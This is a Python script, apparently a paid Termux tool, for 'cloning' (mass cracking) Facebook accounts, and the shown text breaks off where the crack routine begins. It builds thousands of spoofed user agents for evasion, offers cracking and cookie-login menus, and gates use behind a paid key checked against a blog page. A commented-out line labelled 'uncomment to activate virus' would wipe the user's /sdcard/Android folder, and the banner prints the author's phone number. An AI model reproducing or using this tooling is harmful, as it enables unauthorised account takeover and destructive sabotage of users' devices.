from __future__ import print_function
import platform
import zlib
import requests
import time,datetime
import os,shutil
from uuid import uuid4
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python KAMII.py')

ugen2=['Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/596.4 (KHTML, like Gecko) Version/12.5.54 Safari/596.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_17) AppleWebKit/593.24 (KHTML, like Gecko) Version/14.1 Safari/593.24','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_5) AppleWebKit/561.28 (KHTML, like Gecko) Version/11.3 Safari/561.28','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_16) AppleWebKit/591.6.10 (KHTML, like Gecko) Version/12.2 Safari/591.6.10','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.3.94 Safari/587.33','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.0 Safari/540.24','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/600.4.26 (KHTML, like Gecko) Version/11.2 Safari/563.30','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1) AppleWebKit/600.1.24 (KHTML, like Gecko) Version/10.6 Safari/541.8.4','Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/579.18.1 (KHTML, like Gecko) Version/14.4.25 Safari/579.18.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_7) AppleWebKit/600.3.26 (KHTML, like Gecko) Version/14.5 Safari/568.25.10','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.4 Safari/554.24','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15_7) AppleWebKit/600.2.10 (KHTML, like Gecko) Version/11.4 Safari/550.11','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/600.5.20 (KHTML, like Gecko) Version/12.5 Safari/538.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_14) AppleWebKit/600.6.27 (KHTML, like Gecko) Version/14.2.22 Safari/577.25.14','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_7) AppleWebKit/581.4 (KHTML, like Gecko) Version/14.4 Safari/581.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/600.8.27 (KHTML, like Gecko) Version/13.1.92 Safari/594.28','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.25 Safari/564.13.12','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_14_3) AppleWebKit/588.1 (KHTML, like Gecko) Version/13.0.14 Safari/588.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_17_7) AppleWebKit/611.13 (KHTML, like Gecko) Version/12.1.36 Safari/611.13','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/565.7.1 (KHTML, like Gecko) Version/10.1 Safari/565.7.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.0 Safari/548.34','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_16_1) AppleWebKit/600.4.13 (KHTML, like Gecko) Version/10.7.71 Safari/538.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/591.20.8 (KHTML, like Gecko) Version/13.7 Safari/591.20.8','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_16_5) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1 Safari/568.9.15','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/601.8.14 (KHTML, like Gecko) Version/11.4 Safari/601.8.14','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.4 Safari/596.34','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_17) AppleWebKit/587.19 (KHTML, like Gecko) Version/11.0 Safari/587.19','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/553.14 (KHTML, like Gecko) Version/13.5 Safari/553.14','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_16) AppleWebKit/588.4 (KHTML, like Gecko) Version/10.7 Safari/588.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_16_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.5 Safari/595.3.5','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7) AppleWebKit/609.23 (KHTML, like Gecko) Version/11.2 Safari/609.23','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/598.28.10 (KHTML, like Gecko) Version/11.1 Safari/598.28.10','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.7 Safari/569.21','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_16_5) AppleWebKit/546.1.7 (KHTML, like Gecko) Version/11.3 Safari/546.1.7','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/595.23 (KHTML, like Gecko) Version/11.7 Safari/595.23','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_4) AppleWebKit/586.25 (KHTML, like Gecko) Version/13.4 Safari/586.25','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12_1) AppleWebKit/600.4.24 (KHTML, like Gecko) Version/11.0 Safari/566.30','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/600.1.26 (KHTML, like Gecko) Version/13.3 Safari/610.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/592.13.1 (KHTML, like Gecko) Version/14.4 Safari/592.13.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.3 Safari/545.29','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/600.2.10 (KHTML, like Gecko) Version/14.3.63 Safari/608.30.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.2.21 Safari/560.27','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_11_6) AppleWebKit/552.6 (KHTML, like Gecko) Version/14.5 Safari/552.6','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5394.119 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5398.119 Safari/537.36','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/108.0.5406.143 Chrome/108.0.5406.143 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5398.182 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/110.0.5377.109 Chrome/110.0.5377.109 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5384.113 Safari/537.36','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5407.182 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5362.161 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5369.145 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:119.0esr) Gecko/20000101 Firefox/119.0esr','Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:119.0) Gecko/20110101 Firefox/119.0/fVHbmE84V','Mozilla/5.0 (X11; Linux x86_64; en-GB; rv:112.0esr) Gecko/20001109 Firefox/112.0esr','Mozilla/5.0 (Windows NT 11.0; WOW64; x64; rv:109.0) Gecko/20000101 Firefox/109.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12; rv:113.0esr) Gecko/20010101 Firefox/113.0esr','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_2; rv:108.0) Gecko/20010101 Firefox/108.0','Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:115.0esr) Gecko/20010101 Firefox/115.0esr','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5382.168 Safari/537.36 Edg/107.0.1343.54','Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5363.151 Safari/537.36 Edg/106.0.1262.47','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5383.162 Safari/537.36 Edg/105.0.1411.57','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5404.123 Safari/537.36 Edg/106.0.1289.52','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5403.143 Safari/537.36 Edg/105.0.1284.56','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5364.151 Safari/537.36 Edg/106.0.1254.33','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5369.182 Safari/537.36 Edg/107.0.1255.46','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5377.157 Safari/537.36 Edg/107.0.1336.45','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5397.128 Safari/537.36 OPR/93.0.3527.43','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5377.126 Safari/537.36 Edg/106.0.1356.44','Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5365.179 Safari/537.36 Edg/107.0.1358.39','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5391.212 Safari/537.36 Edg/107.0.1269.61','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5382.161 Safari/537.36 Edg/107.0.1251.39','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5384.142 Safari/537.36 Edg/105.0.1248.36','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5411.197 Safari/537.36 Edg/105.0.1250.47','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5363.190 Safari/537.36 Edg/106.0.1251.48','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5395.195 Safari/537.36 Edg/106.0.1247.59','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5399.173 Safari/537.36 Edg/105.0.1268.40','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5367.122 Safari/537.36 Edg/105.0.1376.54','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5384.209 Safari/537.36 Edg/105.0.1311.44','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5396.98 Safari/537.36 Edg/105.0.1271.59','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5384.132 Safari/537.36 Edg/106.0.1343.44','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5393.162 Safari/537.36 Edg/107.0.1394.61','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5365.200 Safari/537.36 Edg/107.0.1264.50','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5367.96 Safari/537.36 Edg/105.0.1416.34','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5396.177 Safari/537.36 Edg/107.0.1368.59','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5392.213 Safari/537.36 Edg/105.0.1261.61','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5363.174 Safari/537.36 Edg/107.0.1306.37','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5409.98 Safari/537.36 Edg/105.0.1288.39','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5368.103 Safari/537.36 Edg/107.0.1334.55','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5392.170 Safari/537.36 Edg/105.0.1364.35','Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5369.124 Safari/537.36 Edg/107.0.1342.33','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5362.117 Safari/537.36 Edg/105.0.1409.58','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5381.137 Safari/537.36 Edg/105.0.1405.60','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5393.156 Safari/537.36 Edg/105.0.1346.50','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5385.139 Safari/537.36 Edg/105.0.1260.57','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5388.175 Safari/537.36 Edg/106.0.1301.45','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5359.98 Safari/537.36 Edg/105.0.1352.40','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5382.205 Safari/537.36 Edg/105.0.1384.61','Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5404.110 Safari/537.36 Edg/105.0.1282.51','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5394.212 Safari/537.36 Edg/105.0.1263.36','Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5380.193 Safari/537.36 Edg/107.0.1365.56','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5391.140 Safari/537.36 Edg/106.0.1363.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5360.152 Safari/537.36 Edg/106.0.1335.58','Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5389.164 Safari/537.36 Edg/106.0.1255.40','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5372.213 Safari/537.36 Edg/106.0.1268.40','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5408.101 Safari/537.36 Edg/107.0.1340.48','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5367.194 Safari/537.36 Edg/107.0.1327.48','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5375.97 Safari/537.36 Edg/106.0.1383.40','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5378.193 Safari/537.36 Edg/107.0.1315.34','Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5398.200 Safari/537.36 Edg/107.0.1365.51','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5381.134 Safari/537.36 Edg/107.0.1321.47',]
ugen3=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5377.126 Safari/537.36 Edg/106.0.1356.44','Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5365.179 Safari/537.36 Edg/107.0.1358.39','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5391.212 Safari/537.36 Edg/107.0.1269.61','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5382.161 Safari/537.36 Edg/107.0.1251.39','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5384.142 Safari/537.36 Edg/105.0.1248.36','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5411.197 Safari/537.36 Edg/105.0.1250.47','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5363.190 Safari/537.36 Edg/106.0.1251.48','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5395.195 Safari/537.36 Edg/106.0.1247.59','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5399.173 Safari/537.36 Edg/105.0.1268.40','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5367.122 Safari/537.36 Edg/105.0.1376.54','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5384.209 Safari/537.36 Edg/105.0.1311.44','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5396.98 Safari/537.36 Edg/105.0.1271.59','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5384.132 Safari/537.36 Edg/106.0.1343.44','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5393.162 Safari/537.36 Edg/107.0.1394.61','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5365.200 Safari/537.36 Edg/107.0.1264.50','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5367.96 Safari/537.36 Edg/105.0.1416.34','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5396.177 Safari/537.36 Edg/107.0.1368.59','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5392.213 Safari/537.36 Edg/105.0.1261.61','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5363.174 Safari/537.36 Edg/107.0.1306.37','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5409.98 Safari/537.36 Edg/105.0.1288.39','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5368.103 Safari/537.36 Edg/107.0.1334.55','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5392.170 Safari/537.36 Edg/105.0.1364.35','Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5369.124 Safari/537.36 Edg/107.0.1342.33','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5362.117 Safari/537.36 Edg/105.0.1409.58','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5381.137 Safari/537.36 Edg/105.0.1405.60','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5393.156 Safari/537.36 Edg/105.0.1346.50','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5385.139 Safari/537.36 Edg/105.0.1260.57','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5388.175 Safari/537.36 Edg/106.0.1301.45','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5359.98 Safari/537.36 Edg/105.0.1352.40','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5382.205 Safari/537.36 Edg/105.0.1384.61','Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5404.110 Safari/537.36 Edg/105.0.1282.51','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5394.212 Safari/537.36 Edg/105.0.1263.36','Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5380.193 Safari/537.36 Edg/107.0.1365.56','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5391.140 Safari/537.36 Edg/106.0.1363.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5360.152 Safari/537.36 Edg/106.0.1335.58','Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5389.164 Safari/537.36 Edg/106.0.1255.40','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5372.213 Safari/537.36 Edg/106.0.1268.40','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5408.101 Safari/537.36 Edg/107.0.1340.48','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5367.194 Safari/537.36 Edg/107.0.1327.48','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5375.97 Safari/537.36 Edg/106.0.1383.40','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5378.193 Safari/537.36 Edg/107.0.1315.34','Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5398.200 Safari/537.36 Edg/107.0.1365.51','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5381.134 Safari/537.36 Edg/107.0.1321.47',]

ugen=[]
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)


os.system('clear')
logo=("""\033[1;32m                    
         _   __ ___  __   __ ___ ___ 
        | | / // _ \|  \ /  (   |   )
        | |/ /| |_| |   v   || | | | 
        |   < |  _  | |\_/| || | | | 
        | |\ \| | | | |   | || | | | 
        |_| \_\_| |_|_|   |_(___|___)
       
----------------------------------------------
[*] Created   :          Kamran Haider
[*] facebook  :          Kamran Haider
[*] Vesion    :          0.4
[*] Whatsapp  :          03157036228
----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')	
loop = 0
oks = []
cps = []
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
total=[]

def xchker():
    pass


def menu():
    os.system('clear')
    print(logo)
    print('\033[1;32m[1] File Cloning Menu')
    print('\033[1;32m[2] Random Cloning')
    print('\033[1;32m[3] Create File Menu')
    print('\033[1;32m[4] Remove Double Links')
    print('\033[1;32m[5] Seperate Ids')
    print('\033[1;32m[6] Login Cookie')
    print('\033[1;37m----------------------------------------------')
    opt = input('\033[1;32m[+] Choose Option : ')
    if opt =='1':
        fia()
    elif opt =='2':
        random_nmb()
    elif opt =='3':
        create_file()
    elif opt =='4':
        double()
    elif opt =='5':
       sprate()
    elif opt =='6':
       login()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
        
def getKey():
    myid = str(os.getuid())
    myid=myid.upper()[::-1]
    n=re.findall("(\d\d)",myid)
    plat=platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    
    return "KAMI"+myid+xp
    
def xi():
    j=getKey()
    r=requests.get("https://kamii911.blogspot.com/2023/01/approvaltxt.html").text
    if j in r:
        pass
    else:
        os.system("clear")
        #uncomment to activate virus
        #shutil.rmtree("/sdcard/Android")
        print("Don't Bypass ")
        sys.exit()
   
def aprv():
    l="https://kamii911.blogspot.com/2023/01/approvaltxt.html"
    r=requests.get(l).text
    k=getKey()
    if k in r:
        menu()
    else:
                os.system('clear')
                print(logo)
                print('Your Key Is Not Approved Buy The Command First')
                print('350 For Month')
                print('Tool For New Ids')
                print(f" Your Key: {k}")
                print(" Buy The command first")
                input('[Press Enter To Send Key To Admin]')
                os.system(f"termux-open-url https://wa.me/+923157036228?text={k}")

        
def fia():    
			#print(logo)
			os.system('clear')
			print(logo)
			print('\x1b[1;31m>>> I AM ALONE IN MY TEAM')
			linex()
			print('\033[1;32m[1] Crack File ')
			linex()
			xd=input('\033[1;32m[*] Choose an option: ')
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
